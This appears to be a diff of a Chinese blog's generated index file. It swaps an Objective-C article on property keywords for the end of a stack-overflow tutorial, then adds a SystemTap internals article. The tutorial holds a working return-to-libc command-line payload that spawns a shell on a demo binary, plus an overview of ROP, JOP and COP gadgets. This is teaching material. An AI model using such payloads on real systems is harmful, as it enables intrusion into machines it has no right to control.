p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x180015</span><br><span class="line"><span class="variable">$3</span> = <span class="number">0</span>xf7f78015</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE4.png"></p>
-<p>如上图所示，原来对象的 retainCount 不变，新 copy 出来的对象副本的 retainCount=1 ，原对象引用计数不变，两者 copy 之后互不相关，这是深拷贝。</p>
+<p>然后对应着前面的图，填充地址就可以执行了：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ./a.out <span class="variable">$</span>(python <span class="literal">-c</span> <span class="string">&#x27;print &quot;A&quot; * 140 + &quot;\x70\x6f\xe3\xf7&quot; + &quot;\xa0\xa7\xe2\xf7&quot; + &quot;\x15\x80\xf7\xf7&quot; + &quot;\0\0\0\0&quot;&#x27;</span>)</span><br><span class="line">argv[<span class="number">1</span>]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApo���������</span><br><span class="line">sh<span class="literal">-4</span>.<span class="number">2</span><span class="comment">#  #进入shell啦</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的A*140，是因为从buffer的起始地址到ret返回地址有140个字节的长度（具体计算可参考上一篇有关shellcode的文章）。</p>
 <blockquote>
-<ul>
-<li><strong>深拷贝与浅拷贝</strong></li>
-</ul>
-<p><strong>深拷贝</strong>： 是对内存空间的拷贝，也就是这里的 copy（数组等类型例外）<br><strong>浅拷贝</strong>： 是对内存地址的拷贝，也就是上面的 retain/strong，以及 copy 的某些情况<br><strong>深拷贝和浅拷贝比较复杂，我的另一篇文章有具体讲解<a href="https://harpersu00.github.io/accb5a79.html">copy 与 mutableCopy（传说中的深浅拷贝</a>，这里只是简要提及一下。</strong></p>
+<p>这里需要注意的是，如果地址中出现0a，比如0xf7f70aa0，为\xa0\x0a\xf7\xf7，在这里\x0a在命令行参数中代表换行符\n，所以会截断字符，这是就需要替换掉这个地址，找其他函数或者字符串。如果是\x20，代表回车，需要用双引号括起来。</p>
 </blockquote>
-<p><strong>注意！ 如果是 copy 的是一个 NSArray 呢?</strong> 比如：</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSArray</span> *array = [<span class="built_in">NSArray</span> arrayWithObjects:<span class="string">@"hello"</span>,<span class="string">@"world"</span>,<span class="string">@"baby"</span>];</div><div class="line"><span class="built_in">NSArray</span> *array2 = [array <span class="keyword">copy</span>];</div></pre></td></tr></tbody></table>
-
-<p>这个时候,系统的确是为 array2 开辟了一块内存空间,但是我们要知道的是, array2 中的每个元素,,只是 copy 了指向 array 中相对应元素的指针，这是<strong>“单层深拷贝”</strong>.</p>
-<hr>
-<p><strong>一般来说，不要将 copy 用到 NSMutableString ，NSMutableArray ，NSMutableDictionary 等可变对象上，除非有特别的需求。</strong></p>
-<p>例如:</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSMutableArray</span> *mutableArray_copy;</div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)viewDidLoad {</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line"></div><div class="line">    <span class="built_in">NSMutableArray</span> *mutableArray = [<span class="built_in">NSMutableArray</span> arrayWithObject:<span class="string">@"123"</span>];</div><div class="line">    <span class="keyword">self</span>.mutableArray_copy = mutableArray;</div><div class="line"></div><div class="line">    [<span class="keyword">self</span>.mutableArray_copy addObject:<span class="string">@"456"</span>];</div><div class="line">}</div></pre></td></tr></tbody></table>
-
-<p>运行则会报出错误 <strong>signal SIGABRT</strong></p>
-<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE5.png"></p>
-<p>我们明明在代码里用的 NSMutableArray 这个可变数组，为什么错误里会说是在向 NSArray 这个不可变数组，调用 addObject: 这个方法呢？（ __NSArrayI 表示的是 NSArray 类型）。<br>是因为在 <code>self.mutableArray_copy = mutableArray;</code> 这一句的时候，会调用 mutableArray_copy 的 setter 方法， copy 属性默认 setter 方法是这样写的:</p>
-<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setMutableArray_copy:(<span class="built_in">NSMutableArray</span> *)mutableArray_copy {</div><div class="line">    _mutableArray_copy = [mutableArray_copy <span class="keyword">copy</span>];</div><div class="line">}</div></pre></td></tr></tbody></table>
-
-<p>setter 方法里调用的是 copy，而不是 mutableCopy ，也就是说拷贝过来的是不可变的 NSArray 类型。那么 NSMutableArray 的添加元素等方法自然就不能使用了。<br>解决方法为：将 copy 改为 strong ；或者重写 setter 方法，将 copy 改为 mutableCopy 。</p>
+<p><code>Return to libc</code>方法的不足之处在于，如果开启了ASLR，那么我们就没法事先确定动态库的加载位置了。</p>
+<p>另外还有一种方法叫<code>Return to PLT</code>，PLT在我的<a href="https://harpersu00.github.io/1e59798b.html">GOT表劫持</a>这篇文章中有介绍，是在懒加载的时候使用的，如果程序已经调用过了这个动态库函数，那么可以直接通过PLT调用，不需要知道它的实际地址。</p>
+<h2 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP (Return Oriented Programming)"></a>ROP (Return Oriented Programming)</h2><p>在<code>Return to libc</code>中我们直接找的函数地址，我们也可以将函数拆成几条指令组成的以<code>ret</code>指令结尾的小代码片段的集合，来执行，这就是ROP。（Return to libc其实就是ROP中的一个特例）</p>
+<p>这些小的以<code>ret</code>指令结尾的代码片段，被称之为<code>ROP gadget</code>。（之所以是ret结尾，是因为ret之后会从栈中读取下一个返回地址（gadget），然后继续执行，这样才可以把gadget拼接到一起）</p>
+<p>多个<code>ROP gadget</code>拼接成的可执行片段称为ROP链。</p>
+<p>在栈上填充的用于执行ROP链的数据，成为<code>ROP Payload</code>。</p>
 <blockquote>
-<p>copy 现在都比较少用，一般用于 NSString 。因为<strong>父类指针可以指向子类对象</strong>，NSMutableNSString 是 NSString 的子类，使用 strong 的话虽然 NSString 是不可变对象，但是它传入的值可能会是 NSMutableString 可变对象，<strong>如果这个可变对象的内容在其他地方被修改了，那 NSString 指针所指的对象也随之改变了</strong>，而其本身可能对此毫不知情。因此一般用 copy 。</p>
+<p>ROP是使用以ret结尾的片段。</p>
+<p>使用以jmp结尾的片段叫做JOP，<code>pop esi; jmp dword[esi+0x10]</code></p>
+<p>以call结尾的片段叫做COP，<code>mov eas, dword[esp+0x20]; call dwork[eax+0x20]</code></p>
+<p>（JOP和COP有时也被合并到ROP中）</p>
 </blockquote>
-<h2 id="nonull-nullable-null-resettable"><a href="#nonull-nullable-null-resettable" class="headerlink" title="nonull nullable null_resettable"></a>nonull nullable null_resettable</h2><p>这三个属性关键字是 WWDC2015 中介绍的 OC 新特性，与 Swift 中的 ? 和 ! 类似。</p>
-<ul>
-<li><strong>nonull</strong>：该属性不能为 nil ,必须有值。</li>
-<li><strong>nullable</strong>：表示可选的，可以为 nil。</li>
-<li><strong>null_resettable</strong>：表示 setter 方法是 nullable ,可以为 nil；而 getter 方法是nonull ，必须有值。</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，就是内存处理方式不一样，assign/weak 相当于借用传入的指针变量来指向对象（实际上并不是，可以这样理解），retain/strong 相当于不同的指针变量指向同一个对象，copy 则是在内存里复制了一个对象并指向它。读写属性以及原子性比较简单，不再赘述。</p>
-<p>关于 atomic 的锁机制，以及 ARC 机制到底如何进行的内存管理，之后会进一步学习。敬请期待。</p>
-<p>2016.12.07 补充：</p>
-<p>新增博文： <a href="https://harpersu00.github.io/cc4dc5e6.html">ARC 是如何进行内存管理的</a></p>
-<hr>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Objective-C 内存管理——你需要知道的一切　<a href="https://segmentfault.com/a/1190000004943276">https://segmentfault.com/a/1190000004943276</a><br>[2] @property属性关键字详解　<a href="http://www.wugaojun.com/blog/2015/07/25/at-propertyshu-xing-guan-jian-zi-xiang-jie/">http://www.wugaojun.com/blog/2015/07/25/at-propertyshu-xing-guan-jian-zi-xiang-jie/</a><br>[3] Objective-C 的自动引用计数（ARC）　<a href="https://hran.me/archives/objective-c-automatic-reference-counting.html">https://hran.me/archives/objective-c-automatic-reference-counting.html</a><br>[4] Objective-c 内存管理的历史和参考资料　<a href="http://www.pchou.info/ios/2015/06/05/oc-memory-management.html">http://www.pchou.info/ios/2015/06/05/oc-memory-management.html</a></p>
+<p>ROP Gadget现在已经有很多成熟的搜索工具，比较常用的是<a href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a>。</p>
+<p>关于ROP的具体利用方式请查看下一篇文章<a href="">栈溢出之 ROP（二）</a></p>
 ]]></content>
       <categories>
-        <category>编程语言语法</category>
+        <category>漏洞利用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Linux 动态调试之 SystemTap（原理篇）</title>
+    <url>/1bc0f92f.html</url>
+    <content><![CDATA[<p>Solaris 系统的DTrace是动态跟踪，动态调试技术的鼻祖，很多系统都有dtrace，比如Windows，macOS等。它是常驻在内核中的，通过用户执行的dtrace命令，把由D语言编写的脚本，提交到内核中的运行时执行。但是DTrace本身无法在linux中运行。于是大家开始尝试将DTrace移植到Linux，或者说让Linux也拥有像dtrace这样强大的动态调试工具，其中最著名的就是RedHat的SystemTap。</p>
+<a id="more"></a>
+
+<blockquote>
+<p>另外，在Linux 4.9-rc1之后，出现了另一个强有力的工具BPF（The Berkeley Packet Filter），以及扩展后的eBPF，从某种程度上来说，更接近DTrace的动态追踪机制。eBPF已经被4.x版本及之后的内核集成了，它是一个持续在内核态运行的，解释执行字节码的虚拟机。性能上，编译成ebpf字节码执行，比编译内核模块要快得多。（是的，SystemTap就是编译的内核模块）</p>
+</blockquote>
+<p>SystemTap运行流程：</p>
+<p><img src="/images/2020-12-07-Linux-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B9%8B-SystemTap%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/stap_flow_diagram.png"></p>
+<p>如上图所示，我们使用SystemTap时，虽然编写的是.stp文件，使用的是stp自己的语言（类似于dtrace脚本语言和C语言），但systemtap会在编译过程中将这些代码翻译成C代码，再将C代码编译为内核模块.ko，最后加载内核模块。</p>
+<blockquote>
+<p>前4个阶段和后面3个阶段可以不在同一台机器上，即在开发机器上编译内核模块，在目标机器上运行（但内核版本要一致）。</p>
+<p>stap 使用命令选项-p 序号，可以使systemtap在特定阶段停下来，比如stap -p3, 会在生成C代码之后停下来。</p>
+</blockquote>
+<h2 id="Parse（词法语法分析）"><a href="#Parse（词法语法分析）" class="headerlink" title="Parse（词法语法分析）"></a>Parse（词法语法分析）</h2><p>这部分跟普通的程序编译过程是一样的，parse阶段主要是解析stp代码，生成AST树（抽象语法树，Abstract Syntax Tree），检查语法错误。</p>
+<h2 id="Elaborate（语义分析）"><a href="#Elaborate（语义分析）" class="headerlink" title="Elaborate（语义分析）"></a>Elaborate（语义分析）</h2><p>elaborate阶段对生成的这颗AST树进行修剪，其中又包括很多小阶段。每个小阶段都会遍历整棵树，处理每个节点。主要包括stp语言宏的展开，查找stp函数的定义，匹配stp变量类型，<strong>debuginfo相关操作</strong>，符号解析，优化器等等(可以通过选项-u跳过优化阶段)。</p>
+<p>这一阶段会用到systemtap的tapset（模块集合），路径是<code>/usr/local/share/systemtap/tapset</code>，所以这个路径里的函数可以直接拿来用。tapset包含了很多systemtap预定义的事件或函数，比如通用的查询表，受限内存管理，I/O操作等等。虽然也是stp文件，但只能作为库使用，不能直接运行。这一步会查找debuginfo中对应函数/变量/路径等的偏移地址。</p>
+<h2 id="Translate（生成C代码）"><a href="#Translate（生成C代码）" class="headerlink" title="Translate（生成C代码）"></a>Translate（生成C代码）</h2><p>我们使用以下代码，来简单看一下stp编译后的C代码是怎样的。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">global</span> g_s</span><br><span class="line">probe begin &#123;</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    printf(<span class="string">&quot;Hi %d&quot;</span>, a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe oneshot &#123;</span><br><span class="line">    printf(<span class="string">&quot;I&#x27;m in&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe timer.ms(<span class="number">100</span>) &#123;</span><br><span class="line">    printf(<span class="string">&quot;timer&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe end &#123;</span><br><span class="line">    g_s = <span class="string">&quot;now&quot;</span></span><br><span class="line">    printf(<span class="string">&quot;end %s&quot;</span>, g_s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe process(<span class="string">&quot;/lib64/libc.so.6&quot;</span>).function(<span class="string">&quot;gethostbyname&quot;</span>).<span class="keyword">return</span> &#123;</span><br><span class="line">    printf(<span class="string">&quot;uprobe_gethostbyname&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用命令<code>stap -v test.stp -p3 &gt; test.c</code>，可以查看编译后生成的C文件。</p>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>代码部分，首先我们看到的是一个contest的结构体：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;common_probe_context.h&quot;</span></span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8187_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">int64_t</span> l_a;</span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:2 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* source: ./test.stp:4 */</span></span><br><span class="line">          <span class="keyword">int64_t</span> __tmp2;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8187;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8189_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:7 */</span></span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8189;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8190_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:11 */</span></span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8190;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8191_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:16 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* source: ./test.stp:18 */</span></span><br><span class="line">          <span class="keyword">string_t</span> __tmp2;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8191;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8193_locals</span> &#123;</span></span><br><span class="line">    &#125; probe_8193;</span><br><span class="line">  &#125; probe_locals;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">function___global_exit__overload_0_locals</span> &#123;</span></span><br><span class="line">      <span class="comment">/* no return value */</span></span><br><span class="line">    &#125; function___global_exit__overload_0;</span><br><span class="line">  &#125; locals [MAXNESTING+<span class="number">1</span>];</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> MAXNESTING &lt; 0</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">&quot;MAXNESTING must be positive&quot;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifndef</span> STP_LEGACY_PRINT</span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stp_printf_1_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">int64_t</span> arg0;</span><br><span class="line">    &#125; stp_printf_1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stp_printf_2_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span>* arg0;</span><br><span class="line">    &#125; stp_printf_2;</span><br><span class="line">  &#125; printf_locals;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STP_LEGACY_PRINT</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>context这个结构体是在执行各个probe前后被复用的，因为一个context在某个时刻只能处于一个porbe中，所以采用了union来减少内存以及内核的栈空间，将内存设置为probe所用到的最大的变量数。<code>struct probe_xxx_locals</code>用来存储每个probe对应的本地变量。每个本地变量都被加了前缀l_，比如示例中的<code>int64_t l_a</code>。</p>
+<p>long类型的变量会被编译为int64_t，即使是在32位系统上，其实也是64位整数。string类型的变量会被编译为string_t，这是<code>char[MAXSTRINGLEN]</code>的别名，也就是string的大小其实是固定的，当实际数据大于MAXSTRINGLEN时，会被截断，同样，跟字符型数组一样，当数据中存在<code>\0</code>时，也会被截断。</p>
+<p>跟本地变量不同，全局变量有自己独立的结构体：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stp_globals</span> &#123;</span></span><br><span class="line">  <span class="keyword">string_t</span> s___global_g_s;</span><br><span class="line">  <span class="keyword">rwlock_t</span> s___global_g_s_lock;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifdef</span> STP_TIMING</span></span><br><span class="line">  <span class="keyword">atomic_t</span> s___global_g_s_lock_skip_count;</span><br><span class="line">  <span class="keyword">atomic_t</span> s___global_g_s_lock_contention_count;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//这里是一个stub</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">stp_globals</span> <span class="title">stp_global</span> = &#123;</span></span><br><span class="line">  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>全局变量会被加上<code>s_global_xx</code>前缀，而且定义了对应lock。全局变量在使用的时候，都会加上对应的锁。</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>对于probe begin/oneshot/end部分的结构都差不多，以下是probe begin处的代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">probe_8187</span> <span class="params">(struct context * __restrict__ c)</span> </span>&#123;</span><br><span class="line">  __label__ deref_fault;</span><br><span class="line">  __label__ out;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">probe_8187_locals</span> * __<span class="title">restrict__</span> <span class="title">l</span> = &amp; <span class="title">c</span>-&gt;<span class="title">probe_locals</span>.<span class="title">probe_8187</span>;</span></span><br><span class="line">  (<span class="keyword">void</span>) l;</span><br><span class="line">  l-&gt;l_a = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (c-&gt;actionremaining &lt; <span class="number">2</span>) &#123; c-&gt;last_error = <span class="string">&quot;MAXACTION exceeded&quot;</span>; <span class="keyword">goto</span> out; &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="keyword">void</span>) </span><br><span class="line">    (&#123;</span><br><span class="line">      l-&gt;l_a = ((<span class="keyword">int64_t</span>)<span class="number">1L</span>L);</span><br><span class="line">      ((<span class="keyword">int64_t</span>)<span class="number">1L</span>L);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    (<span class="keyword">void</span>) </span><br><span class="line">    (&#123;</span><br><span class="line">      l-&gt;__tmp2 = l-&gt;l_a;</span><br><span class="line">      #ifndef STP_LEGACY_PRINT</span><br><span class="line">        c-&gt;printf_locals.stp_printf_1.arg0 = l-&gt;__tmp2;</span><br><span class="line">        stp_printf_1 (c);</span><br><span class="line">      #<span class="keyword">else</span> <span class="comment">// STP_LEGACY_PRINT</span></span><br><span class="line">        _stp_printf (<span class="string">&quot;Hi %lld&quot;</span>, l-&gt;__tmp2);</span><br><span class="line">      #endif <span class="comment">// STP_LEGACY_PRINT</span></span><br><span class="line">      <span class="keyword">if</span> (unlikely(c-&gt;last_error || c-&gt;aborted)) <span class="keyword">goto</span> out;</span><br><span class="line">      ((<span class="keyword">int64_t</span>)<span class="number">0L</span>L);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">deref_fault: __attribute__((unused));</span><br><span class="line">out:</span><br><span class="line">  _stp_print_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>printf</code>语句被转换成对应的内置函数调用，且代码块前后都加上了括号和花括号，防止代码污染。<code>MAXACTION exceeded</code>部分是为了限制probe的执行时间的，每个probe都有这段代码，避免出现超时导致的内核失去响应的情况。<code>probe oneshot</code>会在<code>_stp_sprint</code>代码块之后多调用一个<code>function___global_exit__overload_0</code>函数，这个函数内部调用了<code>_stp_exit</code>函数。</p>
+<p>在systemtap运行时的begin和end阶段，也就是<code>systemtap_module_init</code>和<code>systemtap_module_exit</code>两个函数调用时，会调用<code>enter_be_probe</code>函数，这个函数会通过<code>struct stap_be_probe</code>中的实例，在<code>(*stp-&gt;probe-&gt;ph)(c)</code>这一行调用对应probe的handler。probe begin/oneshot/end都会注册在<code>struct stap_be_probe</code>结构中。</p>
+<p>所以当systemtap启动时，会调用probe begin/oneshot，区别是oneshot会调用<code>_stp_exit</code>函数，表明将要进入end阶段了，然后在end阶段会调用probe end。</p>
+<p>相比于前面三个probe对应的<code>struct stap_be_probe</code>结构，probe timer对应的是<code>struct stap_hrtimer_probe</code>，然后在<code>systemtap_module_init</code>函数中会注册timer。</p>
+<p>对于process probe，对应的类型是<code>struct stapiu_consumer</code>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">stapiu_consumer</span> <span class="title">stap_inode_uprobe_consumers</span>[] = &#123;</span></span><br><span class="line">  &#123; .return_p=<span class="number">1</span>, .target=&amp;stap_inode_uprobe_targets[<span class="number">0</span>], .offset=(<span class="keyword">loff_t</span>)<span class="number">0x119230</span>ULL, .probe=(&amp;stap_probes[<span class="number">4</span>]), &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个<code>.offset=(loff_t)0x119230ULL</code>的值，就是<code>gethostbyname</code>函数在process<code>/lib64/libc.so.6</code>（实际指向<code>/usr/lib64/libc-2.17.so</code>）中的偏移。可以通过命令<code>readelf -f /usr/lib64/libc-2.17.so | grep gethostbyname</code> 查看。这也是编译期间为什么需要debuginfo，这样才可以找到函数对应的偏移地址，然后加上库的基地址，就是实际运行地址了。</p>
+<p>systemtap会检查已存在以及新创建的进程，如果有匹配某个probe，则会通过内核API注册对应的probe，然后内核触发回调时，就会执行这个函数。所以，每个匹配的进程都会执行probe。</p>
+<p>如果需要指定进程的话，可以使用-x PID（会赋值给 <em>target()</em> ），或者-c CMD（新建子进程作为*target()*）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_target = target()</span><br><span class="line"><span class="keyword">if</span> (pid() != _target) &#123;</span><br><span class="line">    next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Build（编译成内核模块-ko）"><a href="#Build（编译成内核模块-ko）" class="headerlink" title="Build（编译成内核模块.ko）"></a>Build（编译成内核模块.ko）</h2><p>前面三个阶段已经生成了c文件，但其中有关于tapset的函数只是做了简单的链接（函数路径），比如：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">c-&gt;last_stmt = <span class="string">&quot;identifier &#x27;exit&#x27; at /usr/local/share/systemstap/tapset/logging.stp:63:10&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在这个阶段，会将这部分一起编译到最终的内核模块里。</p>
+<h2 id="Load-Run（加载运行）"><a href="#Load-Run（加载运行）" class="headerlink" title="Load/Run（加载运行）"></a>Load/Run（加载运行）</h2><p>这部分是通过独立的二进制文件staprun实现的，这可以将编译跟运行环境分开。在<code>staprun/staprun_funcs.c</code>文件中，<code>insert_module</code>函数通过调用系统API<code>init_module</code>，来加载内核模块。</p>
+<p>内核模块探测点的处理函数被封装成接口函数，底层调用Linux提供的kprobe接口函数来注册探测点。静态指针使用tracepoints，动态指针使用kprobe，用户态使用uprobes。</p>
+<blockquote>
+<p>Kprobes，kernel probes，是linux内核的一个重要特性，也是一个轻量级的内核调试工具。perf、systemtap以及4.x之后出现的eBPF都是基于kprobes之上的。它主要有三类，kprobe、kreprobe、jprobe（最新的内核中已经被去掉了）。kprobe是最常使用的，可以在任何指令位置处插入探针。kretprobe可以查看函数执行结束后的参数变化，jprobe在函数进入时使用，类似于kprobe的pre_hanlder。</p>
+<p>kretprobe用trampoline地址替换堆栈上的返回地址。因此当对应函数返回时，会先执行kretprobe设置的trampoline，然后再从trampoline返回到原来的返回地址。</p>
+</blockquote>
+<p>kprobe的运行原理跟GDB很类似，也是基于中断处理的。系统初始化的时候会注册中断处理，在x86系统上分别是<code>int 1</code>和<code>int 3</code>两个trap，对应的函数是<code>do_debug</code>以及<code>do_int3</code>。 在arm64中是BRK（异常处理）指令。</p>
+<p><img src="/images/2020-12-07-Linux-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B9%8B-SystemTap%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/kprobe.png"></p>
+<p>kprobe的运行流程：</p>
+<ol>
+<li>注册kprobe。一个kprobe结构体对应一个探针，包含有插入点地址，以及保存该插入点的原始指令original_opcode</li>
+<li>替换原有指令。将插入点的指令替换为0xcc(int 3, ARM替换为BRK)。这样当CPU执行到该位置时，就会触发int 3或异常处理。</li>
+<li>进入异常态执行pre_handler。找到该位置信息对应的kprobe，执行pre_handler。并将相应寄存器设置成单步调试single-step，将下一条指令设置为original_opcode，然后从异常态返回。</li>
+<li>再次陷入异常态执行post_handler。因为在上一步将下一条即将执行的指令设置为了original_opcode，且设置了single-step。因此从int 3返回后会立即执行原有指令，紧接着触发int 1(single-step)，再次进入异常态。这时首先清除single-step相关的寄存器tag，然后执行kprobe的post_handler，最后从异常态安全返回。</li>
+</ol>
+<p>以上就是kprobe执行过程，就是将原有的一条指令扩展成为<strong>执行pre_handler-&gt;执行原有指令-&gt;执行post_handler</strong>。</p>
+<p>systemtap就是调用的kprobe接口函数来注册stp脚本中定义的探测点。当内核运行到探测点时，就会调用对应的处理函数，其中的输出语句将会通过调用<code>relayfs</code>的接口函数输出数据，也就是下一步的通讯过程。</p>
+<h2 id="Store-Output（用户态-内核态交互，通讯）"><a href="#Store-Output（用户态-内核态交互，通讯）" class="headerlink" title="Store Output（用户态/内核态交互，通讯）"></a>Store Output（用户态/内核态交互，通讯）</h2><p>staprun加载内核模块之后，会exec一个stapio进程（<code>/usr/libexec/systemtap/</code>），跟加载后的内核模块通讯。内核模块会通过<code>debugfs_create_dir</code>和<code>debugfs_create_file</code>两个api创建一个<code>debugfs</code>下的“伪文件”。用户态程序可以通过读写这些“伪文件”来调用内核模块的制定函数。内核模块会创建<code>/sys/kernel/debug/systemtap/$module_name/trace%d</code>这样的文件用于数据流的传输。</p>
+<p>stapio（用户态程序）跟内核模块交互，其实就是对文件进行读写。在<code>int stp_main_loop(void)</code>函数中会对不同的控制指令进行处理，<code>_stp_ctl_wire_cmd</code>函数中有对应的控制指令在内核态部分的处理逻辑。</p>
+<h2 id="Stop-Unload（卸载）"><a href="#Stop-Unload（卸载）" class="headerlink" title="Stop/Unload（卸载）"></a>Stop/Unload（卸载）</h2><p>当满足以下两个条件之一时，straprun就会卸载内核模块：</p>
+<ul>
+<li>stap脚本执行到exit()函数</li>
+<li>向stapio发送信号（比如ctrl+c）</li>
+</ul>
+<p>内核模块将要退出时（遇到exit()函数），会将<code>STP_REQUEST_EXIT</code>控制消息写入伪文件.cmd的buffer中。stapio读取控制流时，看到这个消息，就会相应对应的<code>STP_EXIT</code>。然后内核看到<code>STP_EXIT</code>消息，就会做相应的清理工作，之后再返回<code>STP_EXIT</code>给stapio。stapio接收到这个消息之后就会卸载内核模块。</p>
+<p>如果是stapio收到退出信号（ctrl+c），就会向内核模块发送<code>STP_EXIT</code>消息，然后再卸载内核模块。</p>
